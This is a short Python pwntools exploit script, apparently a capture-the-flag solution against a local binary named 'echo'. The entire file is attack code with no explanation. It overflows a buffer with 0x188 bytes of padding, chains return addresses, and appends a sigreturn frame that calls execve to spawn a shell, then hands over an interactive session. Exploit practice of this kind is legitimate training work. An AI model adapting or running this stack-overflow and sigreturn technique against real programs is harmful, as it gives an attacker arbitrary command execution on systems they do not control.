from pwn import *

context.log_level = 'debug'
context.arch = "amd64"
sh = process('./echo')
gdb.attach(sh)


sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = 0x401035
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rip = 0x40104C

payload = 'a' * 0x188 + p64(0x401000) + p64(0x40104C) + str(sigframe)

sh.sendline(payload)

# sh.sendline('a' * 14)




sh.interactive()